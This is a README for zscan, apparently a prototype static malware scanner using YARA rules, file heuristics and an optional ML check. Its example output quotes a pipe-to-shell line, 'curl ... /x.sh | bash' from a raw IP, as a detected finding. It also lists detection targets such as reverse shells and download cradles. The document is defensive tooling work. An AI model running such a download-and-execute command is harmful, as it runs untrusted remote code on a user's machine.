# zscan

[![CI](https://github.com/michaelsiswantom2-ai/ZScan/actions/workflows/ci.yml/badge.svg)](https://github.com/michaelsiswantom2-ai/ZScan/actions/workflows/ci.yml)

A prototype **static** malware scanner: YARA rule matching plus file heuristics.
It only reads bytes. It never runs or emulates the files it scans, and archives are
opened in memory, never extracted to disk.

## What it checks

| Check | What it looks for |
|---|---|
| Hashes | MD5, SHA-1, SHA-256 of every file |
| Archives | Looks inside zip (incl. docx, jar, apk, whl), tar, gzip, bzip2 and xz, up to 3 levels deep, in memory. Flags zip bombs (compression beyond 1000:1, overlapping entries) and password-protected members. An archive takes the verdict of its worst member, shown as `outer.zip!inner/file.exe`. rar, 7z and zstd are recognised but not opened, and say so (see "Not fully scanned"). |
| Community YARA | `zscan --update` downloads the [YARA-Forge](https://github.com/YARAHQ/yara-forge) rule package (about 5,000 curated rules in `core`) and loads it automatically from then on |
| Bundled YARA | Starter rules in `zscan/rules/` (EICAR, UPX packing for Windows and Linux files, ransomware recovery-blocking commands, injection API strings, Office auto-exec macros, PHP webshells), or your own with `-r` |
| Threat intel | Offline known-bad hash lists (`--hashlist`, plus the MalwareBazaar list from `--update`). With `--intel`: CIRCL hashlookup (known-good files), MalwareBazaar and VirusTotal. Only hashes are sent, never file contents. |
| Entropy | Whole-file and per-section Shannon entropy (packed or encrypted content). Per section only for code: compressed icons and debug data are random-looking in normal programs too |
| PE heuristics (Windows) | Packer section names, writable+executable sections, entry point outside or in the last section, missing imports, import combos that suggest injection, keylogging, anti-debugging or privilege tweaks, bad timestamps, overlays. Only files whose MZ header points at a PE header count as Windows programs; DOS and 16-bit programs (`.fon` bitmap fonts, the Win16 stubs in SysWOW64) are typed `dos` and left alone |
| ELF heuristics (Linux) | Writable+executable segments, entry point outside the executable segments, missing or out-of-file section table, high-entropy code sections, weak import hints (reverse-shell shape, `ptrace`). Uses a small built-in ELF reader (32/64-bit, both byte orders). |
| ML check (opt-in, `--ml`) | ELF, PDF and APK files are scored by machine-learning models trained on the public EMBER2024 data: how much does this file look like malware rather than like benign programs? Meant for files no rule knows yet. A statistical hint, never a verdict on its own (see "ML check" below). |
| Suspicious strings | Encoded PowerShell and download cradles, shadow-copy deletion, Run-key persistence, reverse shells, pipe-to-shell (stronger when aimed at a raw IP), crypto-miner pool URLs, ransom-note text, raw-IP URLs, .onion addresses, big base64 blobs. Everyday mentions (docs, install instructions) are only weak hints, and string hits count one level lower inside compiled binaries. Compressed or encrypted content is skipped, because short patterns match random bytes by chance. |

Each finding has a severity (INFO, LOW, MED, HIGH, CRIT). Findings add up to a 0 to 100 score:
any CRIT or a score of 70+ is **malicious**, 15+ is **suspicious**, the rest **clean**. Weak hints
(LOW) only matter when several pile up. Findings that describe the same trait count once, at their
strongest. A packed program (UPX, Themida and the like) shows many signs of packing at once: packer
section names, high-entropy and writable+executable sections, no import table. Together they count
as one MED finding, so packing alone makes a file suspicious, never malicious. Plenty of signed
commercial software is packed. The same goes for the injection API names (the import check and the
bundled YARA rule see the same names, MED at most, and debuggers, overlays and anti-cheat import them
too) and for zip-bomb signs (a game data pack with many extremely compressed members is one trait).

## Install and run

```bash
pip install -e .            # needs yara-python and pefile, Python 3.10+
zscan path/to/file_or_dir   # or: python -m zscan ...
zscan -q -j 0 ~/Downloads   # only show non-clean files, one worker per CPU core
zscan --json dir > report.json
zscan --files-from flagged.txt   # scan the paths listed in a file, one per line
zscan -r my_rules/ dir      # use your own YARA rules instead of the bundled ones
zscan --update              # fetch YARA-Forge rules + MalwareBazaar recent hashes
zscan --intel suspicious.exe   # also look the hash up online
pip install -e '.[ml]'      # optional: numpy + lightgbm for the ML check
zscan --update-ml           # download the EMBER2024 models (about 11 MB)
zscan --ml -q -j 0 ~/Downloads   # also score ELF, PDF and APK files with them
```

Exit codes: `0` clean, `1` suspicious found, `2` malicious found, `3` only errors (unreadable files
or folders, or files that crashed a scan worker), `4` the scan stopped early (scan workers kept
crashing, so only part of the files were scanned; the summary says so), `130` interrupted.

Example (real output):

```
MALICIOUS  score=100  samples/eicar.com
    type=text size=68 entropy=4.872 sha256=275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f
    [CRIT] YARA: EICAR_Test_File  (EICAR antivirus test file (harmless industry test string))
CLEAN      score=  0  samples/old.rar
    ~ not fully scanned: RAR archive: contents not scanned (format not supported)
SUSPICIOUS score= 25  samples/setup.sh
    type=script size=54 entropy=4.54 sha256=2c67fe11ad08cce646f010aed281829378b535fa52283cf6a1d061cdd58668ef
    [MED ] Pipe-to-shell download from a raw IP address  (e.g. 'curl -s http://203.0.113.5:8080/x.sh | bash\n')
    [LOW ] Pipe-to-shell download  (e.g. 'curl -s http://203.0.113.5:8080/x.sh | bash\n')
    [LOW ] URL with raw IP address  (e.g. 'http://203.0.113.5:8080/x.sh | bash\n')

Scanned 3 file(s): 1 clean, 1 suspicious, 1 malicious, 0 skipped, 0 error; 1 not fully scanned
```

### Not fully scanned

A "clean" verdict only covers what zscan could look at. When it could not check something, it
says so in text and JSON (`unscanned`, and `partly_scanned` in the summary) and keeps the verdict
as it is: formats it cannot open (rar, 7z, zstd), corrupt archives, password-protected or oversized
archive members, archives nested too deep or with too many members, and YARA rules that timed out.
Files over `--max-size` are listed as `skipped`.

### Parallel scanning (`-j`)

`-j N` runs the analysis in N worker processes (`-j 0` is one per CPU core). Results come out in
the same order and are identical to a single-process scan. Hash lookups and archive roll-ups stay
in the main process, so online lookups keep their rate limits. On 4 cores a scan of `/usr/bin` with
community rules loaded went from 51 s to 16 s.

If a file crashes a worker (a bug in a native library such as YARA or a decompressor can take the
whole process down), zscan scans every file that was in flight again, one at a time, so it finds the
one that does it. That file is reported as an error and listed under "Files that crashed a scan
worker" (`crashed_files` in JSON), and the scan carries on. Only if a fresh worker cannot even scan a
few harmless bytes does zscan stop, with exit code 4 and the summary of what it did scan. This needs
`-j 2` or more: with `-j 1` everything runs in one process, so such a crash ends the scan.

### Scanning a whole computer

```bash
zscan -q -j 0 --progress -o C:\zscan-report.txt C:\       # Windows, one drive at a time
zscan -q -j 0 --progress -o ~/zscan-report.txt /home /usr /opt /etc /var    # Linux
```

`-o FILE` writes the report as UTF-8, so file names in any language come through, and leaves the
report itself out of the scan. The summary line still appears on screen. `--progress` prints a
line every 30 seconds. To check only what an earlier scan flagged, list those paths in a file, one
per line, and pass it with `--files-from` (UTF-8 or UTF-16, so PowerShell's `>` works; lines
starting with `#` are ignored). On a whole drive zscan also:

- skips Windows cloud-only files (OneDrive "online-only" files and similar) instead of reading
  them, because reading one makes Windows download it. They are counted as skipped, "cloud-only".
- does not follow folder links (symlinks, and directory junctions on Windows), so nothing is
  scanned twice and a link loop cannot trap it.
- lists every folder it could not open, for example system folders that need administrator
  rights, under "Folders that could not be opened" instead of leaving them out quietly. If nothing
  else was found, that makes the exit code 3.
- keeps going when a file name cannot be shown on the console (Thai names on an English Windows
  code page, say): those characters are printed as escapes.
- recognises its own files and copies of them, for example inside a pip-cached wheel, and lists
  them as skipped, "ZScan's own file", under "Skipped as ZScan's own files" (`own_files` in JSON).
  Rule files are full of the very strings they look for, and reports quote what they found, so
  scanning them only raises alarms about ZScan itself. It knows: its own package folder (the code,
  including bytecode for any Python version, its rules and lists; any other kind of file there is
  scanned), the YARA rule files it loaded, the downloaded community rules, every file from its own history that it
  would flag (`zscan/own-history.sha256`, so copies of older versions count too), and every report
  it wrote with `-o` (noted in `reports.sha256` in the cache folder; output redirected with `>` is
  not noted). Matching is by exact content, never by name or folder: an edited copy is scanned like
  any other file. Two of these are taken as they are on disk, so whatever sits under those names in
  the cache folder is trusted: the downloaded rule files (`rules/yara-forge.yar`, `.yarc`, `.json`)
  and the report list. Every file skipped this way is listed, so none of it is hidden.
- sums up cloud-only files by folder, so you can see which sync folder they belong to.

### Community rules (`--update`)

Downloads YARA-Forge's latest release (`--rule-pack core|extended|full`, default `core`), checks it
compiles, and stores it precompiled in the cache folder (`~/.cache/zscan`, or `$ZSCAN_HOME`). If a
download is broken, the previous rules stay in place. YARA-Forge `score` maps to severity:
85+ CRIT, 70+ HIGH, 60+ MED, lower LOW. Two kinds of rule are capped at MED, because on a Windows PC
they fired on validly signed software: the Malpedia rules generated by yara-signator (names ending
in `_Auto`, about a third of `core`), which match code sequences that also occur in shared libraries
such as OpenSSL or a compiler runtime, and threat-hunting rules (`Hunting` in the name). Use
`--no-community` to scan without them. The rules
come from many authors under their own licenses, so they are downloaded, not stored in this repo.

`--update` also saves MalwareBazaar's recent SHA-256 list (last 48 hours, CC0) as an offline hash
list that is checked on every scan. abuse.ch now requires a free Auth-Key for it, so this step runs
only when `MALWAREBAZAAR_API_KEY` is set (the same key `--intel` uses), and is skipped with a note
otherwise. The keyed download is written from abuse.ch's documentation and has not yet been tried
against the live service.

### Online hash lookups (`--intel`)

Off by default, because it sends file hashes to third parties.

| Source | Needs | Result |
|---|---|---|
| CIRCL hashlookup | nothing | INFO "known-good file" if the hash is in NSRL or similar |
| MalwareBazaar | `MALWAREBAZAAR_API_KEY` (free abuse.ch Auth-Key) | CRIT if the hash is a known sample |
| VirusTotal | `VT_API_KEY` | CRIT at 5+ engines, MED at 1 to 4 |

VirusTotal's free tier allows 4 requests a minute, so zscan waits 15 s between calls
(`VT_MIN_INTERVAL` to change it) and only asks about executables, scripts, Office/PDF files,
archives and anything already flagged. Answers are cached for 24 hours. A network failure is a
warning, not a crash.

### ML check (`--ml`, optional)

Rules and signatures only catch what someone has already seen. `--ml` adds a second opinion for
**ELF** (Linux programs), **PDF** and **APK** (Android apps) files: a model reads 696 numbers about
the file (how often each byte value occurs, how random each stretch looks, counts of telltale text
such as `/bin/`, `http://` or `password`) and answers how much the file resembles malware rather than
benign programs, from 0 to 1. Windows programs (PE) are not covered yet.

```bash
pip install -e '.[ml]'     # numpy and lightgbm
zscan --update-ml          # downloads 3 models, about 11 MB, from huggingface.co into the cache folder
zscan --ml -v suspicious.elf
```

```
SUSPICIOUS score= 15  suspicious.elf
    type=elf size=912344 entropy=7.1 sha256=...
    [MED ] ML model: resembles known malware  (score 0.997, EMBER2024 ELF model)
```

(illustration of the format, not real output)

- **Models and data.** The classifiers published with the [EMBER2024](https://github.com/FutureComputing4AI/EMBER2024)
  dataset (3.2 million files, Apache-2.0, KDD 2025). zscan trains nothing and stores no malware: the
  dataset holds numbers computed from files, not the files. zscan recomputes those numbers itself
  (`zscan/ml/features.py`); see `THIRD_PARTY_NOTICES.md`.
- **Reading the result.** A score from 0.99 up (change with `--ml-threshold`) is reported as MED, so
  the file counts as suspicious; from 0.90 as a weak LOW hint. With `-v` every scored file shows its
  score, and `--json` has an `ml` entry with the model name and score. The check can never make a file
  *malicious* alone: it is a statistical guess about files nobody has seen, so it only adds to what
  YARA and the heuristics found. A missing model, or a file too small to judge, is listed under "not
  fully scanned" instead of passing silently.
- **Downloads.** `--update-ml` fetches over HTTPS from huggingface.co. A model is installed only after
  LightGBM can load it and it has the expected 2,568 columns, and its SHA-256 is saved next to it. The
  expected checksums are not pinned inside zscan yet; that needs one verified download first.
- **Cost.** Reading each file's text and byte patterns is the slow part. A scan of 3,353 system files
  (1,794 of them ELF programs, 1.5 GB) with `-j 4` took 56 s with `--ml` instead of 35 s, about 50 ms
  per program. That was timed with a stand-in model, so the model call itself (one LightGBM
  prediction per file) is the one part not measured with the real models.
- **Measuring it yourself.** `python -m zscan.ml.evaluate fetch DIR` downloads EMBER2024's test and
  challenge data; `... test --kind elf --data DIR/ELF_test.zip --challenge DIR/challenge.zip` reports how
  much newer malware is caught at what false-alarm rate (the test set is the 12 weeks after the
  training weeks); `... local --kind elf /usr/bin /opt` scores your own programs to show how many
  false alarms to expect on your machine. Pick `--ml-threshold` from that.

**What has and has not been checked.** The feature numbers are identical to the official extractor's
on 1,026 real files from the build machine (446 ELF programs and 580 other files: source code, text,
archives, images, documents). Every value of all four groups was compared with a verbatim copy of the
official code; `python -m zscan.ml.verify` repeats that check against an installed copy of the
official package. The download, loading, scoring, command-line and parallel paths are covered by
tests that use a small stand-in model. What is **not** measured yet is how well the real models work
through zscan: the machine this was built on could not reach Hugging Face, so the real models and
test data were never downloaded. Until `evaluate test` and `evaluate local` have been run, treat the
default threshold of 0.99 as a provisional guess, and expect that programs unlike the training files
(distribution packages, custom builds) may score high without being malicious.

## Tests

```bash
pip install -e '.[test,ml]' && pytest   # without the ml extra, the ML tests are skipped
```

CI runs the suite on Linux with Python 3.10 to 3.13, and on Windows with Python 3.12. Tests build harmless samples at runtime (the EICAR test
string, hand-made non-runnable PE and ELF files, scripts with ransomware-style commands, nested and
booby-trapped archives). Network sources are faked, so tests run offline. No real malware is used
or stored. A fuzz test feeds each file kind 150 randomly damaged copies to check that nothing
crashes or hangs.

Before a release, run `python tools/own_history.py` as the last step before committing (with the
community rules installed). It rewrites `zscan/own-history.sha256` from the git history and the
working tree, so the new version recognises copies of every earlier one. A checkout where the
tests have run also holds compiled tests in `tests/__pycache__`; ZScan flags those, since they
carry the test samples, and they are never shipped.

## How well does it hold up?

Checked on a stock Linux box (nothing on it is malware), with the YARA-Forge core rules loaded:

| Test set | Result |
|---|---|
| Whole machine: 166,487 files under `/usr`, `/opt`, `/etc`, `/var` and more, including archives | 0 malicious. 9 suspicious: 8 Go toolchain test fixtures that really are unrunnable ELF files (entry point outside any executable segment), and 1 Google Cloud SDK install script that really does download and run an installer with PowerShell |
| Same scan before the string checks were tuned (144,614 files) | 59 suspicious, mostly documentation, UI strings and install instructions that mention `downloadFile` or `curl ... \| bash` |
| System folders (`/usr/bin`, Python packages, shared libraries) | 6,260 files, 0 flagged, 43 s with `-j 4` |
| Compressed files | 1,658 `.gz`, `.xz`, `.bz2` and `.zst` files, 0 flagged |
| ELF reader against `readelf` | Sections, segment flags and imports agree on 1,500 real binaries |

On that machine 36 files were reported as not fully scanned: 13 zstd files (not supported), a few
archives over the member limit, a handful of deliberately corrupt archives in compression-library
test data, and members over 64 MiB.

## Limits (it's a prototype)

- Static only, so it is easy to evade with obfuscation, and it cannot see behaviour.
- No rar, 7z or zstd unpacking, no Mach-O structure checks, files over 64 MiB are skipped.
- The ML check covers ELF, PDF and APK files only (not Windows programs, scripts or Office files) and
  its accuracy through zscan is not yet measured, see "ML check".
- Heuristics are tuned on one Linux machine and one Windows PC. Expect some noise on other kinds of
  files. Windows support is new; the tests run on Windows in CI.
- No Authenticode check yet: a signed program from a known vendor is judged like any other, so
  packed or protected commercial software shows up as suspicious.
- YARA with the community rules is the slow part: roughly 15 files a second per core on system
  binaries (about 50 per core without them).
